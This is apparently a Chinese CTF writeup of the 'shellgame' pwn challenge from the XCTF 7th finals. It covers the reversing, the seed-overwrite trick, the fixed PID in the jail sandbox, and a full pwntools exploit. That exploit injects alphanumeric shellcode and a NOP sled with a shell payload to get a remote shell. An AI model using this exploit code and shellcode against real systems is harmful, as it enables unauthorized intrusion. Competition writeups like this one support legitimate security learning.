---
title: 「PWN」【XCTF-final 7th】 Pwn Writeup WP 复现
authors: [nova]
tags: ["CTF", "Pwn", "writeup", "wp"]
---

import Link from '@docusaurus/Link';

第一次线下大赛？全靠学长带飞，第一天解题赛拿了第二，可惜第二天 King of Hill 失利了最终只拿了一等奖。

~~准确来说好像这个奖和我没啥关系（笑）~~

但是学到了很多

<!--truncate-->

## Let's play shellgame

Misc Pwn，在 Misc 分支里，有 6 解。
运气好拿了个一血。

整个题有很多 trick，最后的 exp 还有很多优化的地方，不过比赛的时候管不了那么多。

### 程序分析

![image-20230409233807386](https://oss.nova.gal/img/image-20230409233807386.png)

首先可以分析一下逻辑：将 0~0x1000 这个内存权限改为 RWX，之后运行了这个内存的代码，所以推测要写 shellcode

![image-20230409234142546](https://oss.nova.gal/img/image-20230409234142546.png)

在 `init_env` 里，将 name 填充了 160 个随机数，并且输出了前十个随机数。注意到 `seed` 只有 256，所以其实我们可以爆破出初始 seed，然后将 160 位 name 全部补齐

![image-20230409234335295](https://oss.nova.gal/img/image-20230409234335295.png)

![image-20230409234421662](https://oss.nova.gal/img/image-20230409234421662.png)

观察 `getnumber` 函数，可以看到往 `buffer` 上读入了 0x14 个字节的内容，然而 `buffer` 大小为 0x10，正好可以溢出覆盖后面的 `seed`，但是有什么作用暂时不清楚。

![image-20230409234626691](https://oss.nova.gal/img/image-20230409234626691.png)

在 `playgame` 函数里，又重设了随机数种子，这样的话在 `getnumber` 里就可以直接设置随机数种子，从而一定程度上可控。

继续看 `playgame`，它改变了 name[i] 以及 name[i-1]、name[i+1] 三位，因此，我们可以思考这样的操作：

- 已知 name[i] = y，如果想要设置 name[i] 为特定值 x，我们可以通过指定 name[i+1]，设置特定的随机数种子，使其 `rand()%256` 为 `x-y`
- 此时，name[i+1] 也会自增上另一个 `rand() % 256`， name[i+2] 也会自增。
- 之后，我们可以如法炮制，指定 name[i+2] 来设置 name[i+1] 为特定值。
- 最后，利用 n+1 个 name，我们可以控制 name[0, 1, ..., n] 的值，注意此时 n+2 也会改变。

![image-20230409235536471](https://oss.nova.gal/img/image-20230409235536471.png)

让我们看它接下来的条件。首先，他要保证 name[i] 位于 47 和 122 之间，也就是说我们的 name 是需要可见的。当然，我们可以通过将 name[n] 设置为 0，来绕过它对后文的检查。

假设没有 messstr 函数，我们就可以将 name 设置为这样的格式，从而没有必要对整个 name 160 字节都进行设置，也不用在设置前 n 个 name 后考虑 n+1 和 n+2 在加上随机值之后是否可见，我们只需要设置 name[n] 为 \x00 即可。

```
-----------------------------------------------------
|  visible shellcode | \x00 | \xde \xad \xbe \xef ..|
-----------------------------------------------------
```

![image-20230410000029657](https://oss.nova.gal/img/image-20230410000029657.png)

最后就是 messstr()，估计很多队伍都卡在这里。简单来说它通过程序的 pid 作为随机数种子对 name 进行了置换。

我们并没有强行逆向这个函数，而是通过 fuzz 的方法，设置 name 为 `aaaaaaaaaaaaaaa...` 的方法确定了是置换而非某种加密。

因此，其实我们可以思考：如果我们知道某个 pid 的置换规则（在 debug 时候我们可以在 `getpid()` 函数返回后设置 rax 寄存器为特定值来设置返回值），那么我们只需要利用它的逆置换就能得出 name 的顺序。

问题就是：一般来说，当我们开启一个程序后，它的 PID 一般是变化的，如果要打的话，我们只能先获得一个 PID 的置换规则，然后通过爆破的方法，直到程序 PID 为我们设置的那个值，这样的爆破空间是非常大的，估计很多队伍也在这里犯了难。

在编写 exp 爆破之前，我们恰巧查看了 Dockerfile

![image-20230410000627857](https://oss.nova.gal/img/image-20230410000627857.png)

注意到它使用了 pwn.red/jail 这个镜像，在查阅后发现它是一个完全隔离的沙箱环境。此时我们开始思考：如果它是类似于开启子进程的方法，会不会 getpid() 获取的是他的父进程 pid 呢？这样在重复开启进程时，由于父进程没有被杀死，所以 pid 是不会变的。

因此我们编写了一个打印 pid 的程序，并通过修改 dockerfile 的方法将它放到沙箱中运行。

```c
#include <unistd.h>
#include <stdio.h>

int main(int argc, char const *argv[])
{
    /* code */
    printf("%d\n", getpid());
    return 0;
}

```

在测试后，我们发现这个函数返回的值一直是 1，这样爆破的问题就迎刃而解了。

最后的问题就是如何编写可见 shellcode。

由于我们只有 157（最后三位要用于 0 绕过）个字节长，所以利用现成的可见 shellcode 拿 shell 是不成立的（它有 160+ 字节长）。所以我们的思路是，根据 [Alphanumeric shellcode - NetSec](https://nets.ec/Alphanumeric_shellcode)，生成一个 read 的 shellcode 读入大量字节（推测可能 rdx 不用设置，rax 也有可能不需要设置，所以会简化很多，但是后面发现其实都要设置 haha）从而通过 nop 滑板滑到 getshell 的 shellcode 上去。

:::info

其实我们并没有手动编写 shellcode，而是利用[veritas501/ae64: basic amd64 alphanumeric shellcode encoder (github.com)](https://github.com/veritas501/ae64) 直接生成了 shellcode。感觉手写还是会很麻烦，但是有可能会更短一些？

:::

### 脚本编写

脚本的编写较为复杂。因为现场环境存在一个 timeout 的问题，所以我们选择了预打表的方式，打出了第一个随机数为 `0~255` 时的随机数种子以及下两个随机数用于设置 name，在本地测试了置换表之后打出了置换顺序（打的是 145 字节的表，不够的就补全 0 了）

在拿到 `gift` 之后，通过爆破 `0~255` 的随机数种子确定随机数，然后获取完整 name 保存备用。

之后就是 name 的设置，这个当时写的比较丑陋，也没有优化，就将就着看吧（笑

整体 exp 写的不是很满意，因为 name 涉及到数据类型，python 处理的并不是很好，用了 numpy 的 np.int8，但是没用太明白，效率有点低。

在这种大赛里时间确实宝贵，感觉还是得学学 python 里的数据处理或者直接用 C 写。

~~还好还是拿到了一血~~

最终 exp:

```python
from pwn import *
from ctypes import *
from typing import List
from Crypto.Util.number import *
import numpy as np
context.log_level="DEBUG"
context.terminal = "wt.exe nt bash -c".split()
context(arch='amd64', os='linux')

HOST='localhost'
# HOST='172.35.6.100'
PORT=11451
p = remote(HOST, PORT)
# p = process(['./shellgame'])

libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")


table = {
-128:[118, [-128, 67, 202]],
-127:[300, [-127, 46, 15]],
-126:[1404, [-126, 241, 154]],
-125:[172, [-125, 213, 36]],
-124:[694, [-124, 23, 128]],
-123:[188, [-123, 79, 132]],
-122:[159, [-122, 222, 16]],
-121:[227, [-121, 238, 138]],
-120:[35, [-120, 249, 143]],
-119:[179, [-119, 242, 185]],
-118:[68, [-118, 216, 98]],
-117:[466, [-117, 21, 86]],
-116:[333, [-116, 227, 57]],
-115:[316, [-115, 54, 233]],
-114:[93, [-114, 153, 96]],
-113:[67, [-113, 47, 91]],
-112:[512, [-112, 232, 237]],
-111:[411, [-111, 65, 154]],
-110:[45, [-110, 59, 11]],
-109:[191, [-109, 46, 104]],
-108:[71, [-108, 3, 52]],
-107:[658, [-107, 215, 201]],
-106:[705, [-106, 236, 115]],
-105:[223, [-105, 110, 96]],
-104:[236, [-104, 105, 187]],
-103:[51, [-103, 143, 116]],
-102:[40, [-102, 5, 169]],
-101:[310, [-101, 67, 17]],
-100:[197, [-100, 202, 80]],
-99:[216, [-99, 77, 188]],
-98:[53, [-98, 14, 80]],
-97:[115, [-97, 119, 196]],
-96:[230, [-96, 27, 65]],
-95:[94, [-95, 15, 236]],
-94:[52, [-94, 8, 117]],
-93:[147, [-93, 241, 154]],
-92:[141, [-92, 19, 61]],
-91:[30, [-91, 254, 187]],
-90:[170, [-90, 241, 3]],
-89:[362, [-89, 41, 156]],
-88:[64, [-88, 237, 252]],
-87:[273, [-87, 22, 97]],
-86:[13, [-86, 191, 125]],
-85:[737, [-85, 73, 147]],
-84:[425, [-84, 245, 40]],
-83:[351, [-83, 111, 106]],
-82:[166, [-82, 166, 56]],
-81:[87, [-81, 28, 8]],
-80:[110, [-80, 232, 48]],
-79:[263, [-79, 90, 123]],
-78:[77, [-78, 197, 122]],
-77:[305, [-77, 14, 95]],
-76:[324, [-76, 139, 5]],
-75:[26, [-75, 216, 142]],
-74:[201, [-74, 50, 221]],
-73:[37, [-73, 231, 73]],
-72:[100, [-72, 119, 133]],
-71:[17, [-71, 127, 173]],
-70:[413, [-70, 133, 132]],
-69:[262, [-69, 210, 61]],
-68:[140, [-68, 146, 139]],
-67:[6, [-67, 24, 185]],
-66:[72, [-66, 9, 77]],
-65:[11, [-65, 117, 150]],
-64:[730, [-64, 167, 101]],
-63:[388, [-63, 202, 85]],
-62:[22, [-62, 242, 242]],
-61:[260, [-61, 158, 3]],
-60:[493, [-60, 82, 195]],
-59:[111, [-59, 151, 69]],
-58:[47, [-58, 251, 67]],
-57:[20, [-57, 97, 82]],
-56:[203, [-56, 123, 139]],
-55:[598, [-55, 36, 232]],
-54:[346, [-54, 152, 105]],
-53:[199, [-53, 61, 159]],
-52:[420, [-52, 125, 221]],
-51:[98, [-51, 187, 47]],
-50:[1096, [-50, 123, 51]],
-49:[205, [-49, 217, 181]],
-48:[12, [-48, 178, 146]],
-47:[353, [-47, 151, 254]],
-46:[280, [-46, 96, 157]],
-45:[75, [-45, 122, 63]],
-44:[145, [-44, 75, 14]],
-43:[15, [-43, 61, 102]],
-42:[542, [-42, 23, 26]],
-41:[82, [-41, 122, 100]],
-40:[215, [-40, 145, 17]],
-39:[282, [-39, 215, 98]],
-38:[57, [-38, 40, 173]],
-37:[485, [-37, 174, 179]],
-36:[269, [-36, 192, 85]],
-35:[4, [-35, 66, 51]],
-34:[294, [-34, 153, 71]],
-33:[210, [-33, 244, 89]],
-32:[156, [-32, 210, 236]],
-31:[76, [-31, 55, 200]],
-30:[287, [-30, 154, 98]],
-29:[261, [-29, 106, 178]],
-28:[36, [-28, 211, 72]],
-27:[301, [-27, 219, 225]],
-26:[529, [-26, 50, 189]],
-25:[33, [-25, 80, 85]],
-24:[204, [-24, 242, 56]],
-23:[116, [-23, 229, 173]],
-22:[267, [-22, 192, 157]],
-21:[249, [-21, 184, 151]],
-20:[237, [-20, 220, 68]],
-19:[330, [-19, 232, 187]],
-18:[335, [-18, 33, 105]],
-17:[59, [-17, 12, 23]],
-16:[414, [-16, 144, 33]],
-15:[83, [-15, 252, 43]],
-14:[1245, [-14, 128, 24]],
-13:[226, [-13, 88, 159]],
-12:[225, [-12, 24, 147]],
-11:[7, [-11, 59, 67]],
-10:[525, [-10, 107, 166]],
-9:[520, [-9, 65, 188]],
-8:[217, [-8, 49, 192]],
-7:[44, [-7, 57, 220]],
-6:[2, [-6, 68, 127]],
-5:[1057, [-5, 119, 60]],
-4:[49, [-4, 251, 69]],
-3:[416, [-3, 242, 153]],
-2:[370, [-2, 190, 34]],
-1:[295, [-1, 240, 195]],
0:[589, [0, 170, 30]],
1:[96, [1, 131, 218]],
2:[550, [2, 202, 4]],
3:[9, [3, 165, 114]],
4:[109, [4, 178, 252]],
5:[84, [5, 43, 20]],
6:[554, [6, 67, 157]],
7:[105, [7, 134, 135]],
8:[54, [8, 64, 250]],
9:[328, [9, 133, 89]],
10:[32, [10, 216, 106]],
11:[90, [11, 246, 212]],
12:[221, [12, 103, 46]],
13:[254, [13, 211, 50]],
14:[23, [14, 30, 158]],
15:[256, [15, 9, 23]],
16:[73, [16, 91, 60]],
17:[364, [17, 244, 173]],
18:[176, [18, 114, 99]],
19:[224, [19, 151, 242]],
20:[277, [20, 68, 108]],
21:[323, [21, 181, 8]],
22:[211, [22, 88, 211]],
23:[66, [23, 176, 213]],
24:[671, [24, 34, 4]],
25:[19, [25, 56, 120]],
26:[177, [26, 21, 253]],
27:[5, [27, 106, 221]],
28:[39, [28, 227, 184]],
29:[69, [29, 190, 153]],
30:[196, [30, 190, 218]],
31:[385, [31, 155, 242]],
32:[95, [32, 27, 205]],
33:[698, [33, 177, 203]],
34:[131, [34, 83, 81]],
35:[150, [35, 67, 112]],
36:[376, [36, 207, 191]],
37:[27, [37, 124, 154]],
38:[135, [38, 188, 36]],
39:[238, [39, 83, 167]],
40:[429, [40, 64, 241]],
41:[311, [41, 152, 5]],
42:[50, [42, 6, 126]],
43:[63, [43, 32, 98]],
44:[447, [44, 207, 239]],
45:[142, [45, 11, 211]],
46:[320, [46, 81, 158]],
47:[104, [47, 209, 47]],
48:[21, [48, 58, 15]],
49:[146, [49, 209, 160]],
50:[61, [50, 250, 40]],
51:[114, [51, 33, 143]],
52:[334, [52, 233, 11]],
53:[483, [53, 111, 9]],
54:[683, [54, 248, 48]],
55:[91, [55, 45, 97]],
56:[495, [56, 16, 86]],
57:[60, [57, 197, 160]],
58:[3, [58, 216, 209]],
59:[92, [59, 64, 10]],
60:[392, [60, 198, 201]],
61:[504, [61, 51, 105]],
62:[255, [62, 14, 234]],
63:[56, [63, 133, 102]],
64:[70, [64, 169, 14]],
65:[89, [65, 186, 214]],
66:[417, [66, 59, 99]],
67:[80, [67, 48, 161]],
68:[43, [68, 201, 95]],
69:[46, [69, 216, 237]],
70:[34, [70, 150, 8]],
71:[340, [71, 23, 231]],
72:[31, [72, 11, 174]],
73:[24, [73, 240, 235]],
74:[444, [74, 211, 101]],
75:[134, [75, 181, 27]],
76:[688, [76, 85, 192]],
77:[882, [77, 168, 62]],
78:[86, [78, 10, 233]],
79:[421, [79, 29, 11]],
80:[322, [80, 148, 50]],
81:[119, [81, 69, 223]],
82:[526, [82, 190, 153]],
83:[133, [83, 41, 0]],
84:[510, [84, 227, 245]],
85:[383, [85, 213, 189]],
86:[18, [86, 79, 30]],
87:[128, [87, 120, 54]],
88:[209, [88, 227, 238]],
89:[668, [89, 220, 45]],
90:[763, [90, 211, 242]],
91:[246, [91, 172, 68]],
92:[202, [92, 186, 121]],
93:[130, [93, 112, 247]],
94:[117, [94, 87, 37]],
95:[318, [95, 179, 69]],
96:[194, [96, 253, 46]],
97:[65, [97, 56, 165]],
98:[122, [98, 187, 214]],
99:[796, [99, 244, 148]],
100:[108, [100, 38, 195]],
101:[655, [101, 81, 148]],
102:[403, [102, 214, 10]],
103:[0, [103, 105, 198]],
104:[38, [104, 252, 132]],
105:[58, [105, 153, 227]],
106:[183, [106, 159, 76]],
107:[242, [107, 253, 36]],
108:[138, [108, 17, 14]],
109:[41, [109, 76, 178]],
110:[521, [110, 221, 147]],
111:[10, [111, 38, 152]],
112:[78, [112, 77, 228]],
113:[88, [113, 197, 7]],
114:[467, [114, 2, 30]],
115:[28, [115, 8, 9]],
116:[361, [116, 151, 114]],
117:[695, [117, 215, 25]],
118:[74, [118, 130, 199]],
119:[29, [119, 164, 79]],
120:[8, [120, 34, 152]],
121:[106, [121, 126, 255]],
122:[314, [122, 92, 234]],
123:[148, [123, 130, 24]],
124:[16, [124, 137, 253]],
125:[186, [125, 110, 211]],
126:[566, [126, 128, 206]],
127:[286, [127, 232, 146]],
}

def get_gift():
    p.recvuntil(b'Welcome to the shellgame! Your lucky number is:\n')
    init = p.recvline().decode().split(' ')
    gift = defaultdict(int)
    for i in init[:-1]:
        k = i.split(':')
        gift[int(k[0])]=int(k[1])
    return gift

def send_number(payload: bytes, seed: int = None):
    if seed is not None:
        payload = payload.ljust(0x10, b'\x00') + seed.to_bytes(4, 'little')
    print(payload)
    p.send(payload)

def get_seed(gift) -> int:
    for i in range(255):
        k = list(gift.values())
        libc.srand(i)
        for j in range(10):
            a = struct.unpack(">b", (libc.rand() % 256).to_bytes(1, 'big'))[0]
            if a != k[j]:
                break
            if j == 9:
                return i

def get_full_list(seed: int) -> List[int]:
    libc.srand(seed)
    return [struct.unpack(">b", (libc.rand() % 256).to_bytes(1, 'big'))[0] for _ in range(160)]

def get_num_randomed(wanted_int: int) -> int:
    return table[wanted_int][0]


def generate_payload(wanted_payload: bytes, init_list: list) -> dict:
    wanted_payload += b'\x00'
    payload = init_list[:len(wanted_payload)+2]
    action_dict = {}
    payload = [np.int8(i) for i in payload]
    init_list = [np.int8(i) for i in init_list]
    print(payload)

    for i in range(1, len(wanted_payload)+1):
        offset = np.int8(wanted_payload[i-1] - payload[i-1])
        print(offset, type(offset))
        n_table = table[offset][1]
        payload[i-1] = np.int8(payload[i-1] + n_table[0])
        payload[i] = np.int8(payload[i] + n_table[2])
        payload[i+1] = np.int8(payload[i+1] + n_table[1])
        action_dict[i] = table[offset][0]
        print(i, payload)
    print(payload)
    return action_dict


def send_payload(payload: dict):
    for k, v in payload.items():
        print(">> sending", v, "to pos", k)
        send_number(b'1', v)
        send_number(str(k).encode() + b'\n')



def gen_reversed_payload(sc: bytes):
    b=[ 41,  81,  32, 141,  79,  25,  84, 104,  40,  90,   103,   3,   9,  52,  70, 115, 124,  15, 111,  57,   112,  78,  23,  73, 131, 114,  54, 121, 133,  75,    13,  18,  63,   4,  22,  46,  69,  67,  64,  66,    42,   6, 122,  33,  61,  17,  58,  21,  31,  35,    49, 137,  82,  26,  50,  60,  77,  97,  11,  36,    30, 113,  43,  56,   7, 129, 106,  44,  45, 127,   134, 128, 136, 138,  87,  12, 140, 117, 102,  65,    96,   2,  37, 116,  99, 119,  48,  89,  92, 105,   123, 125,  68,  59, 132,  39,  76, 126,  83,  98,   108, 110,  47,  80,  10,  71, 145, 144,  91,  62,    95,  24,  85, 100, 143,  20,  94, 120,  27,  74,    55,  14,  29,  34,  16,  86,  38, 101,  51,  19,    53,  93,  88, 130,  28, 142, 139, 109, 107,  72,   118,   8,   5,   1, 135]
    s='{'
    for i in range(145):
        s+=f'{i}:{b[i]-1},'
    s=s[:-1]
    s+='}'
    dic=eval(s)
    def rev_messstr(payload):
        payload=payload.ljust(145,b'a')
        result=[b'\x00' for i in range(145)]
        for i in range(145):
            result[dic[i]]=payload[i]
        return result
    assert(len(sc)<=145)
    sc=rev_messstr(sc)
    payload=b''
    for i in sc:
            payload+=long_to_bytes(i)
    return payload


init = get_gift()
seed = get_seed(init)
# print(seed)

full_list = get_full_list(seed)
k = (gen_reversed_payload(b'RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjATYfi9430t800t820T860T87RAPZ0t83ZRARZ0t85Z17HAF1HZP'))
action_list = generate_payload(k, full_list)
send_payload(action_list)
# gdb.attach(p, 'b *$rebase(0x13b9)')
# pause(4)
send_number(b'4\n')


sc = b'\x90'*0x70 + asm(shellcraft.sh())

p.sendafter(b'good luck to you!\n', sc)
# p.sendline('cat /flag')
p.interactive()


# print(len(k))
# print(k)
```
